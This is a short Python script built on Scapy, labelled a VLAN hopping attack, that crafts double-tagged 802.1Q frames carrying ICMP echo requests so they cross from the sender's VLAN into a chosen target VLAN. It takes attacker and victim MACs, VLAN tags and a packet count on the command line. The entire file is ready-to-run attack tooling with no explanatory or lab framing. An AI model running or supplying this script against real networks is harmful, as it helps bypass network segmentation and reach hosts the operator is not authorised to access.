#!/usr/bin/env python3

from scapy.all import *
import argparse

def vlan_hopping_attack(interface, target_ip, victim_mac, attacker_mac, outer_vlan, inner_vlan, packet_count):
    """
    Perform a VLAN hopping attack using double tagging and send multiple ICMP Echo Requests (Ping).
    
    :param interface: Network interface to send the attack from
    :param target_ip: IP address of the target/victim
    :param victim_mac: MAC address of the victim's machine
    :param attacker_mac: MAC address of the attacker's machine
    :param outer_vlan: VLAN tag of the current VLAN
    :param inner_vlan: VLAN tag of the target VLAN to hop into
    :param packet_count: Number of ICMP Echo Requests to send
    """

    # Create a double-tagged ICMP Echo Request (Ping) packet
    packet = (
        Ether(src=attacker_mac, dst=victim_mac) /
        Dot1Q(vlan=outer_vlan) /
        Dot1Q(vlan=inner_vlan) /
        IP(dst=target_ip) /
        ICMP(type=8)  # ICMP Echo Request (type=8)
    )

    print(f"Sending {packet_count} double-tagged ICMP packets on interface {interface}...")

    for i in range(packet_count):
        print(f"Sending packet {i+1}/{packet_count}...")
        ans, unans = srp(packet, iface=interface, timeout=2, verbose=False)

        # Check for replies
        if ans:
            for snd, rcv in ans:
                print(f"Reply from {rcv[IP].src}: {rcv.summary()}")
        else:
            print(f"No reply for packet {i+1}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VLAN Hopping Attack Script (Double Tagging Method with Multiple ICMP Echo Requests)")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use for the attack")
    parser.add_argument("-t", "--target-ip", required=True, help="Target IP address in the VLAN to hop into")
    parser.add_argument("-vm", "--victim-mac", required=True, help="MAC address of the victim machine")
    parser.add_argument("-am", "--attacker-mac", required=True, help="MAC address of the attacker's machine")
    parser.add_argument("-ov", "--outer-vlan", required=True, type=int, help="VLAN tag of the current VLAN")
    parser.add_argument("-iv", "--inner-vlan", required=True, type=int, help="VLAN tag of the target VLAN to hop into")
    parser.add_argument("-c", "--count", required=True, type=int, help="Number of ICMP packets to send")
    
    args = parser.parse_args()
    
    # Pass the parsed arguments to the function
    vlan_hopping_attack(
        args.interface, 
        args.target_ip, 
        args.victim_mac, 
        args.attacker_mac, 
        args.outer_vlan, 
        args.inner_vlan, 
        args.count
    )